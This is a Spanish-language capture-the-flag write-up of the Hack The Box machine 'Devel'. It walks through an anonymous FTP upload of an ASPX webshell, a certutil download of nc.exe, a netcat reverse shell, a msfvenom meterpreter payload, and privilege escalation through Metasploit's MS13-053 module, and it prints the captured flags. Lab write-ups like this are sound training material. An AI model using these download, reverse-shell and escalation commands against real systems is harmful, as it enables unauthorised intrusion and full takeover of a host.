---
tags:
title: Devel - Easy (HTB)
permalink: /Devel-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p21,80 10.129.234.162                                                                          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 15:26 -0300
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 15:27 (0:00:00 remaining)
Nmap scan report for 10.129.234.162
Host is up (0.59s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.98 seconds
```

## Website 

Nada de nada en la pagina.

![image-center](/assets/images/Pasted image 20260106153043.png)

## Shell as iis apppool\web

### FTP

En la conexión por `ftp` me permite a mi, subir archivos, por lo que subí una [webshell](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx) `aspx`.

```bash
ftp anonymous@10.129.234.162
Connected to 10.129.234.162.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49166|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************|  3016       44.25 MiB/s    --:-- ETA
226 Transfer complete.
3016 bytes sent in 00:01 (2.75 KiB/s)
```

Usando le key del mismo repositorio, puedo ejecutar comandos.

![image-center](/assets/images/Pasted image 20260106153237.png)
### Reverse shell

Asi que subi el `nc.exe` con el siguiente comando.

```bash
certutil -urlcache -split -f http://10.10.17.19/nc.exe C:\programdata\nc.exe
```

Y ahora para enviarme una shell use este:

```bash
C:\programdata\nc.exe 10.10.17.19 4444 -e cmd.exe
```

Y desde mi listener recibo mi shell.

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.162] 49169
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

## Shell as nt authority\system

Veo que tengo el privilegio `SeImpersonatePrivilege`.

```powershell
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

### Get meterpreter shell

Primero para abusar del mismo necesito de una shell como web en mi listener de `metasploit`, ya que intente previamente con el uso de `PrintSpoofer`, `JuicyPotato`, pero no funciona.

Por lo que primero necesito crear un binario malicioso en arquitectura `x86`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.19 LPORT=4444 -a x86 --platform windows -f exe -o payload.exe
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe

```

Luego configure mi listener en `msfconsole`, subí el binario a la maquina y lo ejecute.

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[*] Sending stage (188998 bytes) to 10.129.234.162
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.234.162:49192) at 2026-01-06 15:57:46 -0300

meterpreter > background
[*] Backgrounding session 1...
```
### Exploit suggester

Envié la sesión atrás, para poder usar el `exploit suggester` de `metasploit`.

```bash
msf exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester
```
### MS13-053

Setee la sesión `1` y lo corri, lo que me dio miles de opciones.

```bash
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.234.162 - Collecting local exploits for x86/windows...
[*] 10.129.234.162 - 229 exploit checks are being tried...
<SNIP>
[*] Running check method for exploit 43 / 43
[*] 10.129.234.162 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                    
 4   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 13  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 <SNIP>
[*] Post module execution completed
```
### Shell

Probando uno por 1 me funciono el `MS13-053`.

```bash
msf exploit(windows/local/ms10_092_schelevator) > use exploit/windows/local/ms13_053_schlamperei
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms13_053_schlamperei) > set session 1
session => 1
<SNIP>
msf exploit(windows/local/ms13_053_schlamperei) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[*] Launching notepad to host the exploit...
[+] Process 3328 launched.
[*] Reflectively injecting the exploit DLL into 3328...
[*] Injecting exploit into 3328...
[*] Found winlogon.exe with PID 432
[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
[*] Sending stage (188998 bytes) to 10.129.234.162
[*] Meterpreter session 2 opened (10.10.17.19:4444 -> 10.129.234.162:49193) at 2026-01-06 16:02:53 -0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2668 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

Y ya puedo ver la flag del usuario babis, la cual desde la shell de `web` no pude.

```powershell
C:\Users\babis\Desktop>type user.txt
type user.txt
cbcdd3ec9a738d0bb066acd30bae5fe9
```

Y además la de `administrator`.

```powershell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
1ca7b792318e00d3d0b732ccbf1a0b86
```

`~Happy Hacking.`